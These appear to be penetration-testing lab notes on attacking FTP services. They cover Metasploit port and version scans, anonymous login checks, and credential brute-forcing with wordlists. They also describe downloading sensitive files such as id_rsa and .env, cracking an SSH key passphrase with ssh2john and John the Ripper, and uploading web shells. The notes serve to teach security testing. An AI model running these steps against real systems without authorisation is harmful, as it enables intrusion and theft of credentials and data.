## Overview

- **Port**: `21/TCP`
- **Purpose**: Transfers files between client and server.
- Often used to manage **web server content** (upload/download files).

## Security Notes

- Authentication: **username + password**
- **Anonymous login** often enabled if misconfigured (`anonymous` / `anonymous` or blank password)
- Credentials sent in **plaintext** (unless FTPS is used)

---

## Step-by-Step Workflow in Metasploit

### 1. **Check if FTP Port Is Open**
```msf
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.1.10
set PORTS 21
run
```

### 2. **Identify FTP Server Version**
```msf
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.1.10
run
```

‚Üí Reveals software (e.g., `vsftpd 3.0.3`) ‚Üí guides exploit selection.

### 3. **Find Relevant Modules**
Reduce noise with targeted search:
```msf
search type:auxiliary name:ftp
```

### 4. **Test for Anonymous Login**
```msf
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.1.10
run
```
> ‚úÖ Always try this first ‚Äî common in labs and misconfigured servers.

### 5. **Brute-Force Credentials (If Needed)**
```msf
use auxiliary/scanner/ftp/ftp_login
set RHOSTS 192.168.1.10
set USER_FILE /usr/share/wordlists/metasploit/default_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/default_pass.txt
run
```

### 6. **Download Files Manually (e.g., `secret.txt`)**
Metasploit **cannot download files via auxiliary modules** ‚Äî use native FTP client:
```bash
ftp 192.168.1.10
# When prompted:
#   Name: anonymous
#   Password: anonymous (or leave empty)
ftp> ls                # List remote files
ftp> get secret.txt    # Download to current directory
ftp> quit
```

> üí° Look for sensitive files: `secret.txt`, `.env`, `backup.zip`, `config.php`, etc.
> ‚ö†Ô∏è Never assume FTP is secure ‚Äî always test for anonymous access and weak credentials.

---
---
# FTP Enumeration & SSH Key Exploitation

## 1. Initial FTP Enumeration

When port 21 is identified as `open`, start with these steps:

### Connection & Basic Info

- **Banner Grabbing:** Note the version (e.g., `vsFTPd 3.0.3`) for potential exploits.
    
- **Anonymous Login:** Try `anonymous` : `anonymous`.
    
- **Nmap Automation:**
 ```sh
 nmap -p 21 --script ftp-anon,ftp-syst <target-ip>   
 ```
### Essential FTP Commands

FTP is for file transfer, not file viewing. Use these to interact with the server:

- `ls -la`: List all files, including hidden ones (e.g., `.ssh`).
    
- `binary`: Switch to binary mode (prevents corruption of keys/exes).
    
- `prompt off`: So it doesn't ask "Are you sure?" for every file.
    
- `get <file>`: Download a specific file to your local machine.
    
- `mget *`: Download all files in the current directory.
    
- `put <file>`: Upload a file (useful for web shells if in a web root).

---
## 2. Handling the SSH Private Key (`id_rsa`)

If you find an `id_rsa` file, you likely have a direct path to a shell.
### Step 1: Prepare the Key

SSH will refuse to use a private key that has "loose" permissions. You must restrict it:

```sh
chmod 600 id_rsa
```

### Step 2: Identify the User

Check other files found on FTP (like `note.txt`) or web reconnaissance for a username.

- **Attempt Login:**
``` sh
ssh -i id_rsa <username>@<target-ip>
```

---
## 3. Cracking the SSH Passphrase

If the SSH login prompts for a **passphrase**, the key is encrypted. You must crack it locally.

### Step 1: Convert the Key to a Hash

Use the `ssh2john` tool to create a format that John the Ripper understands:
```sh
ssh2john id_rsa > id_rsa.hash
```

### Step 2: Brute Force the Passphrase

Use a wordlist (like `rockyou.txt`) to find the passphrase:
```sh
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

### Step 3: Authenticate

Once the passphrase is cracked, run the SSH command again and enter the discovered passphrase when prompted.

---
## 4. Troubleshooting Common Errors

|**Error**|**Cause**|**Fix**|
|---|---|---|
|`Connection refused`|Port is closed or filtered.|Check Nmap; try different ports.|
|`Permissions 0644 are too open`|`id_rsa` is insecure.|`chmod 600 id_rsa`|
|`Invalid command`|Tried `cat` or `type` in FTP.|Use `get` to download, then `cat` locally.|
